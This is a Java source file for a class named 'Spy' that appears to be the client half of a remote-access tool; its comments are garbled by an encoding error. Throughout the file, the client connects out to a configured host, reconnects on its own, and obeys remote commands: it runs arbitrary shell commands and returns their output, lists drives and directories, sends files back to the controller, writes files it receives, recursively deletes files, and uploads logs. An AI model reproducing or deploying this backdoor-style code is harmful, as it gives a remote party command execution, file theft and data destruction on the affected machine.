package Sleve;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class Spy extends Thread {
	static String firestPort="3067";
	static String secondPort="3068";
	Process pro = null;
	static String currentpath = "DiskUnknown!!";// �Զ���ȡ��һ������
	static File file;
	static FileInputStream deskin = null;
	static DataInputStream in = null;		//������ӿ�
	static DataOutputStream out = null;		//������ӿ�
	static DataOutputStream tout=null;		//������ӿ�
	static Socket ss = null;				//��ͨѶ�˿�
	static Socket sc=null;					//��ͨѶ�˿�
	static LogGenerator log = null;
	static HashMap<String,String> setup = null;
	public static boolean canceled=false;
	static Monitor monitor=null;
	public static boolean power=true;		//�ļ��в���Ȩ��
	public static void main(String[] args) {
		try {
			log = new LogGenerator("Spy");
		} catch (Exception e) {}
		setup();
		new Spy();
	}
	public static void sendLog() {
		File f=new File("SPyproperties/logs");
		File []log=f.listFiles();
		try {
			out.writeUTF("<#log#>"+log.length);
			BufferedReader fr=null;
			for(File lo:log) {
				fr=new BufferedReader(new FileReader(new File(f,lo.getName())));
				out.writeUTF("<#LOG_FN#>"+lo.getName());
				String a=null;
				while((a=fr.readLine())!=null) {
					out.writeUTF(a);
				}
				try {
					Thread.sleep(100);
				} catch (InterruptedException e) {}
				out.writeUTF("21341343");
				fr.close();
			}
			out.writeUTF("<#LOG_FI#>");				//��־���
			System.out.println("���");
		} catch (IOException e) {
			e.printStackTrace();
			try {
				out.writeUTF("<#fail#>");
			} catch (IOException e1) {}
		}
	}
	private static void setup() {
		setup = new HashMap<>();
		setup.put("port","3066");
		setup.put("ip","localhost");
		try {
			BufferedReader bf = new BufferedReader(new FileReader("SPyproperties/startup/setup"));
			String line = null;
			while ((line = bf.readLine()) != null) {
				String key=line.contains(":")?line.substring(0,line.indexOf(":")):null;
				if(key!=null) {
					setup.put(key.trim(), line.substring(line.indexOf(":")+1,line.length()).trim());
				}
			}
			rc("ͨ�������ļ���ʼ���˿ں�ip���");
			bf.close();
		} catch (Exception e) {
			rc(3,"�����ļ���ʽ��ʼ��ʧ�ܣ����ڲ��ò�������3066��IP:localhost");
				System.out.println("��ȡ�����ļ�ʧ�ܣ�������Ĭ������");
				File f=new File("SPyproperties/startup");
				f.mkdirs();
				FileWriter fw=null;
				try {
					fw=new FileWriter("SPyproperties/startup/setup");
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				try {
					fw.write("port:3066\r\nip:localhost");
					fw.close();
				} catch (IOException e1) {}
		}

	}
	public Spy(String test) {}//�����ڲ�������"�ӿ�"
	private Spy() {
		rc("����������");
		boolean b = true;
		while (b) {
			try {
				ss = new Socket(setup.get("ip"),Integer.parseInt(setup.get("port")));
				rc("���ӵ�Զ�̿���̨");
				this.start();
				b = false;

			} catch (UnknownHostException e) {
			} catch (IOException e) {
			}
			try {
				Thread.sleep(20);
			} catch (InterruptedException e) {

			}
		}

	}

	@Override
	public void run() {
		rc("���������߳�");
		try {
			in = new DataInputStream(ss.getInputStream());
			out = new DataOutputStream(ss.getOutputStream());
			out.writeUTF("<#NAME#>" + InetAddress.getLocalHost().getCanonicalHostName());
			rc("��������������");
		} catch (IOException e) {
			rc(3,"IO������ʧ�ܣ�������Զ�̻����ر�");
		}
		rc("�����߳������ɹ�");
		while (true) {
			String msg = "";
			canceled=false;
			Monitor.alive=true;
			try {
				msg = in.readUTF();
				rc("�յ���Ϣ��"+msg);
			} catch (IOException e) {
				try {
					ss.close();
				} catch (IOException e1) {}
				try {
					out.close();
				} catch (IOException e1) {}
				Monitor.close();
				try {
					in.close();
				} catch (IOException e1) {}
				new Spy();
				break;
			}
			System.out.println(msg);
			if (msg.startsWith("<#ip#>")) {
				ip(msg);
				try {
					log.record(0, "send ip");
				} catch (IOException e) {
				}
			} else if (msg.startsWith("<#port#>")) {
				try {
					out.writeUTF("<#port#>" + ss.getPort());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (msg.startsWith("<#desk#>")) {
				desk(msg);
			} else if (msg.startsWith("<#into#>")) {
				into(msg);
			} else if (msg.startsWith("<#all#>")) {
				all(msg);
			} else if (msg.startsWith("<#getfile#>")) {
				if(exist(msg.substring(11))) {
					boolean run=notifyMonitor(msg);
					if(run) {
						getfile(msg.substring(11));
						try {
							tout.close();
							sc.close();
						} catch (IOException e) {}
						sc=null;
						tout=null;
					}
				}else {
					try {
						out.writeUTF("<#fail#>");
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			}else if(msg.startsWith("<#log#>")) {
				sendLog();
			} else if (msg.startsWith("<#del#>")) {
				file = new File(currentpath + "/" + msg.substring(7).trim());
				del(file);
			} else if (msg.startsWith("<#tree#>")) {
				File f = new File(
						msg.substring(8).toString().trim() == "" ? "D:/" : msg.substring(8).toString().trim());
				tree(f);
			} else if (msg.startsWith("<#ol#>")) {
				leave();
			} else if (msg.startsWith("<#run#>")) {
				run(msg);
			} else if (msg.startsWith("<#input#>")) {
				input(msg);
			} else if (msg.startsWith("<#file#>")) {
				file(msg.substring(8));
				try {
					System.out.println("������ϣ��ر�");
					tout.close();
					sc.close();
					monitor.alive=false;
				} catch (IOException e) {}
				sc=null;
				tout=null;
			}else if(msg.startsWith("<#SAME#>")) {
				System.exit(0);
			}else if(msg.startsWith("<#ALLRUN#>")) {
				allrun(msg);
			}else if(msg.startsWith("<#CONNECT#>")) {
				try {
					getConnect(msg.substring(11));
				} catch (Exception e) {
				}
			}else if(msg.startsWith("<#INITDISK#>")){
				currentpath=File.listRoots()[0].toString();
				file=new File(currentpath);
				try {
					out.writeUTF("<#INITDISK#>"+currentpath);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}else {
				MSGExtended.msgExe(msg);
			}
			try {
				LogGenerator.logcheck();
			} catch (IOException e) {}
		}
		rc("�����Ͽ����ѹرյ�ǰ�̣߳����´������߳�");
	}

	public static void file(String msg) {
		// TODO Auto-generated method stub
		FileOutputStream fi = null;
		try {
			fi = new FileOutputStream(currentpath+msg.trim());
			System.out.println("�������"+currentpath+msg.substring(8));
		} catch (FileNotFoundException e1) {
			try {
				tout.writeUTF("<#CANCEL#>");
				out.writeUTF("<#MSG#>����Զ�̼�����ĸ�Ŀ¼��Ҫ���ߵ�ϵͳȨ�ޣ�");
				out.writeUTF("<#fail#>4");
				rc(2,"����Ȩ��ԭ�򱻾�");
				byte[]b=new byte[1024];
				int len=0;
				rc("���ڻ��������");
				while((len=in.read(b))>0) {
					if(new String(b,0,len).equals("wfdfadfe*fdf548")) {
						break;
					}
				}
				rc("������������");
			} catch (IOException e) {}
			return;
		}
		byte[] b = new byte[2048];
		int len = 0;
		rc("���������ļ�");
		try {
			while ((len=in.read(b)) > 0) {
				if ("wfdfadfe*fdf548".equals(new String(b, 0, len))) {
					break;
				}
				fi.write(b, 0, len);
			}
			fi.close();
			rc("�����ļ����");
			if(canceled) {
				rc("�ļ������򴴽�ʱ�յ�Ȩ�����Ƶ���ȡ������Ϊȡ����ɾ�����������ļ�");
				new File(currentpath+msg.substring(8)).delete();
			}
		} catch (IOException e) {
			rc(3,"���������ļ�ʱ����IO�쳣,����ӦΪԶ������ͻȻ����");
			return;
		}
		try {
			out.writeUTF("<#successful#>");
		} catch (IOException e) {
		}
	}

	private void input(String msg) {
		// TODO Auto-generated method stub
		DataOutputStream dos = new DataOutputStream(pro.getOutputStream());
		try {
			dos.writeUTF(msg.substring(9));
			out.writeUTF("<#input#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				out.writeUTF("<#inputfail#>");
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			e.printStackTrace();
		}
	}

	private void run(String msg) {
		String cmd=msg.substring(7).trim();
		rc("ִ�����"+cmd);
		Runtime r = Runtime.getRuntime();
		try {
			pro = r.exec(cmd);
			rc("ִ�гɹ�:"+cmd);
			BufferedReader bf=new BufferedReader(new InputStreamReader(pro.getInputStream()));
			String cell="";
			String result="";
			while((cell=bf.readLine())!=null) {
				result+=cell+"\n";
			}
			out.writeUTF("<#execed#>"+result);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				rc("ִ��ʧ��:"+cmd);
				out.writeUTF("<#execfail#>");
			} catch (IOException e1) {}
		}

	}
	private void allrun(String msg) {
		String cmd=msg.substring(10).trim();
		rc("ִ�����"+cmd);
		Runtime r = Runtime.getRuntime();
		try {
			pro = r.exec(cmd);
			rc("ִ�гɹ���"+cmd);
			out.writeUTF("<#SU#>");
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				rc("ִ��ʧ�ܣ�"+cmd);
				out.writeUTF("<#FA#>");
			} catch (IOException e1) {
			}
		}

	}
	private void leave() {
		rc("����������ֹͣ");
		// TODO Auto-generated method stub
		try {
			out.writeUTF("<#leave#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			out.close();
			in.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			ss.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.exit(0);
	}

	private void all(String msg) {//�鿴�ļ�
		rc("�鿴�ļ��б�");
		// TODO Auto-generated method stub
		String level=msg.substring(7).trim();
		if(level.equalsIgnoreCase("-t")) {//�鿴�ļ�����
			fileview1(false);
		}else if(level.equalsIgnoreCase("-ts")) {
			fileview1(true);
		}else {
			fileview0();
		}
	}
	private void fileview0() {
		rc("�ļ��б�ȼ���0");
		// TODO Auto-generated method stub
		File[] l = file.listFiles();
		StringBuffer s = new StringBuffer("<#simpleall#>");
		
		int i=0;
		for (File f : l) {
			if (f.isDirectory()) {
				s.append(f.getName()+"\n");
			} else {
				s.append(f.getName()+"\n");
			}
			
		}
		try {
			out.writeUTF(s.toString());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	private void fileview1(boolean smart) {		//�鿴�ļ�����
		rc("�ļ��б�ȼ���1");
		List<String> isfile=new ArrayList<>();//�ļ���Ϣ��ȫ��Ϊ�ļ�����Ŀ¼
		// TODO Auto-generated method stub
		File[] l = file.listFiles();
		String s = new String("<#all#>*access*size*name*\n");
		try {
			out.writeUTF(s);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		int i=0;
		for (File f : l) {
			String ss="";
			if(f.getName().equals("$RECYCLE.BIN")) {
				continue;
			}
			long bytecount=getfsize(f);
			String filesize="0";
			double sm=bytecount;//�ļ���С��doubleֵ
			if(smart) {
				
				int count=0;//Ӧ��ת���ĵ�λ
				for(;sm>=1024;) {
					sm/=1024;
					count++;
				}
				sm=(int) (sm*100);
				sm/=100;
				if(count==0) {
					filesize=(int)sm+"B";
				}else if(count==1){
					filesize=sm+"KB";
				}else if(count==2) {
					filesize=sm+"MB";
				}else if(count==3) {
					filesize=sm+"GB";
				}else if(count==4) {
					filesize=sm+"TB";
				}else if(count>4) {
					filesize=sm+">>";
				}
			}else {
				filesize=sm+"B";
			}
			if(f.isDirectory()) {
				ss+="<#all#>"+("d"+(f.canRead()?"r":"-")+(f.canWrite()?"w":"-")+(f.canExecute()?"x":"-")+"*"+filesize+"*"+f.getName()+"\n");
			}else {
				isfile.add(("-"+(f.canRead()?"r":"-")+(f.canWrite()?"w":"-")+(f.canExecute()?"x":"-")+"*"+filesize+"*"+f.getName()+"\n"));
			}
			try {
				out.writeUTF(ss);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		for(String f_:isfile) {
			try {
				out.writeUTF("<#all#>"+f_);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		try {
			out.writeUTF("<#END#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public long getfsize(File file) {
		long size=0;
		if(file.isDirectory()) {
			File[] l=file.listFiles();
			try {
				for(File f:l) {
					size+=getfsize(f);
				}
			}catch(Exception e) {System.out.println("����Ŀ¼��"+file);}
		}else {
			
				size=file.length();
		}
		return size;
	}
	private void desk(String msg) {
		rc("������Ϣ����ȡ");
		// TODO Auto-generated method stub
		File[] f = File.listRoots();
		String s = "<#desk#>";

		for (int i = 0; i < f.length; i++) {
			s += f[i].toString() + "*" + f[i].getTotalSpace() / 1024 / 1024 / 1024 + "GB";
			if(i!=f.length-1) {
				s+=" ";
			}
		}
		

			try {
				out.writeUTF(s);
			} catch (IOException e) {
				rc(4,"���̻�ȡʱԶ�̻�����");
			}
	}
	private void into(String msg) {
		rc("�л�Ŀ¼");
		String p = msg.substring(8);
		p.replace("\\", "/");
		String bu = currentpath;
		File f = null;
		if (p.indexOf(':') == 1) {
			if (p.lastIndexOf('/') == p.length() - 1) {
				bu = p;
			} else {
				bu = p + "/";
			}
		} else {
			if (p.lastIndexOf('/') == p.length() - 1) {
				bu += p;
			} else {
				bu += p + "/";
			}
		}
		try {
			f = new File(bu);
			if (f.isDirectory()) {
				rc("Ŀ¼�л��ɹ�");
				out.writeUTF("<#successful#>");
			} else {
				rc("Ŀ¼�л�ʧ��");
				out.writeUTF("<#fail#>5");
				return;
			}

		} catch (Exception e) {
			rc(4,"�л�Ŀ¼ʱԶ�̻�������");
		}
		if (p.indexOf(':') == 1) {
			if (p.lastIndexOf('/') == p.length() - 1) {
				currentpath = p;
			} else {
				currentpath = p + "/";
			}
		} else {
			if (p.lastIndexOf('/') == p.length() - 1) {
				currentpath += p;
			} else {
				currentpath += p + "/";
			}
		}
		File fi = new File(currentpath);
		if (!(fi.isDirectory())) {
			try {
				out.writeUTF("<#MSG#>drictory no found!");
			} catch (IOException e) {
			}
			return;
		}
		file = fi;
	}
	private static boolean exist(String file) {
		String filename="";
		if(file.indexOf(":")==1) {
			filename=file;
		}else {
			filename=currentpath+file;
		}
		try {
			FileInputStream fi=new FileInputStream(filename);
			try {
				fi.close();
			} catch (IOException e) {}
			return true;
		} catch (FileNotFoundException e) {
			return false;
		}
	}
	public static void getfile(String file) {
		rc("Զ�̻���Ҫ�����ļ�");
		String filename="";
		String simplefilename="";
		if(file.indexOf(":")==1) {
			filename=file;
		}else {
			filename=currentpath+file;
		}
		try {
			FileInputStream fi=new FileInputStream(filename);
			try {
				fi.close();
			} catch (IOException e) {}
		} catch (FileNotFoundException e) {
			System.out.println("�ļ�������");
		}

		int i = filename.lastIndexOf("/");
		simplefilename=filename.substring(i+1);
		try {
			out.writeUTF("<#getfile#>"+simplefilename);
		} catch (IOException e3) {}
		try {
			deskin=new FileInputStream(filename);
		} catch (FileNotFoundException e3) {}
		try {
			byte[] b = new byte[2048];
			int len = 0;
			long filesize=new File(filename).length();		//��ȡ�ļ��Ĵ�С
			long fs=filesize/1024/1024;
			tout.writeUTF("<#FSIZE#>"+fs+"mb");
			long temp=filesize/100;				
			long current=0L;														//��¼��ǰ����
			System.out.println("��ʼ�����ļ�");
			rc("���ڴӱ��ض�ȡ�ļ�������Զ������");
			while ((len = deskin.read(b)) > 0) {
				out.write(b, 0, len);
				if(current>=temp) {
					tout.writeUTF("<#PROGRESS#>");								//���ͽ�����Ϣ
					current=current-temp;
				}
				current+=len;
				if(canceled) {
					System.out.println("ȡ���ɹ�");
					rc("ȡ������");
					break;
				}
			}
			rc("�������");
			System.out.println("�������");
			Thread.sleep(500);// ˯��500�����ӷ��ͽ����ļ������˯һ������Ϊ�˵ȴ��Է�����
			out.write("wfdfadfe*fdf548".getBytes());
			out.writeUTF("<#successful#>");
			if(canceled) {
				out.writeUTF("<#MSG#>��ȡ��");
				log.record(1, "���δ�����ȡ��");
			}else {
				rc("Զ�������ѻ�ȡ���ļ���"+filename);
			}
			canceled=false;
			return;
		} catch (Exception e) {
			e.printStackTrace();
			try {
				log.record(1, "getfile�������������ж�");
			} catch (IOException e2) {
			}
			try {
				out.writeUTF("<#fail#>3");
				return;
			} catch (IOException e1) {
			}
		}
	}

	public void del(File file) {
		rc("Զ������Ҫ��ɾ��Ŀ���ļ�");
		if (file.isDirectory()) {
			File[] f = file.listFiles();
			for (File x : f) {
				del(x);
			}
		} else {
			file.delete();
			return;
		}
		file.delete();
		try {
			rc("ɾ���ɹ�");
			out.writeUTF("<#MSG#>deleted");
		} catch (IOException e) {
			rc(2,"ɾ��ʧ��");
			try {
				log.record(1, "ɾ��ʧ��");
			} catch (IOException e1) {
			}
			return;
		}
	}

	public void ip(String msg) {
		try {
			out.writeUTF("<#ip#>" + ss.getInetAddress().toString());
		} catch (IOException e) {}
	}

	StringBuffer s = new StringBuffer();
	int count = 0;

	public void tree(File f) {
		if (f.isDirectory()) {
			count++;
			s.append("\n\t" + f.getName() + "\n\t");
			File[] ff = f.listFiles();
			if (ff == null) {
				s.append(f.getName());
			} else {
				for (File x : ff) {
					tree(x);
					try {
						Thread.sleep(1);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		} else {
			s.append(f.getName());
		}
		try {
			out.writeUTF("<#tree#>" + s.toString());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static  boolean notifyMonitor(String msg){					//֪ͨ����������ļ����˿�
		rc("����֪ͨԶ�̻��������������˿�");
		try {
			String send=firestPort;
			out.writeUTF("<#OpenPort#>"+send);
			while(true) {													//����cmd���͵���Ϣ���Ƿ����ɹ�
				String port=in.readUTF();
				if(port.startsWith("<#OpenSuccess#>")) {
					System.out.println("�յ��򿪳ɹ�����Ϣ");
					rc("Զ�������ع���Ϣ���򿪳ɹ�");
					break;
				}else if(port.startsWith("<#OpenFail#>")){
					rc(2,"Զ�������ع���Ϣ����ʧ�ܣ������ܶ˿ڱ�ռ��");
					out.writeUTF("<#OpenPort#>"+secondPort);
					send=secondPort;
				}
			}
			getConnect(send);
			return true;
		}catch(Exception e) {
			rc(2,"δ֪���������֪ͨԶ�̿����������˿ڵ�������");
			return false;
		}
		
	}
	public static boolean getConnect(String send) throws NumberFormatException{
		rc("��ʼ����Socket");
		System.out.println("����ʱ�˿ڣ�"+send);
		try {
			sc=new Socket(setup.get("ip"),Integer.parseInt(send));
			rc("Socket�����ɹ�");
		} catch (Exception e) {
			rc(2,"Socket����ʧ��");
			try {
				sc.close();
			} catch (IOException e1) {}
			return false;
		}
		monitor=new Monitor();
		monitor.start();
		try {
			tout=new DataOutputStream(sc.getOutputStream());
		} catch (IOException e) {
			try {
				sc.close();
			} catch (IOException e1) {}
			monitor.alive=false;
			return false;
		}
		System.out.println("�����˿ڴ����ɹ�");
		return true;
	}
	static void rc(int status,String msg) {
		try {
			log.record(status, msg);
		} catch (IOException e) {}
	}
	static void rc(String msg) {
		rc(1,msg);
	}
}